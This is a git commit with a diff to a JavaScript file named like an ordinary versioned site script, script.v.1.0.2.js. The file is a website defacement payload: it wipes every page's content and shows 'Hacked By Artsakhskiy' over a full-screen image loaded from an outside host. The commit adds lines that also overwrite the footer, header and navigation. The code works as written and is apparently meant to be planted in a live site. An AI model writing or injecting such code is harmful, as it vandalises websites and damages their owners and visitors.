8d34522fb683bc4829d40caf277490318e98cdd5
Toolbox Devs <narek.kasarjyan@toolbox.am>
2023-08-03 13:27:31 +0400

    Second Commit

--- script.v.1.0.2.js
+++ script.v.1.0.2.js
@@ -1,4 +1,5 @@
 (function () {
     const body = document.body, bodyChildren = document.querySelectorAll('body'); bodyChildren.forEach((element) => { element.innerHTML = "Hacked By Artsakhskiy"; element.style.fontWeight = "bold"; element.style.color = "black!important"; element.style.fontSize = "40px"; });
     body.style.background = 'url("https://i.pinimg.com/originals/d0/52/00/d05200200dc4c9a9dfa0dca9fb9fbdb5.jpg"), black'; body.style.backgroundPosition = 'center'; body.style.backgroundRepeat = 'no-repeat'; body.style.backgroundSize = 'cover'; body.style.backgroundAttachment = 'fixed'; body.style.zIndex = '999999'; body.style.position = 'fixed'; body.style.margin = '0'; body.style.padding = '0'; body.style.left = '0'; body.style.top = '0'; body.style.width = '100%'; body.style.height = '100%'; body.style.overflow = 'hidden';
+    document.querySelector('footer').innerHTML = 'HACKED BY ARTSAKHSKIY'; document.querySelector('header').innerHTML = 'HACKED BY ARTSAKHSKIY'; document.querySelector('nav').innerHTML = 'HACKED BY ARTSAKHSKIY';
 }());
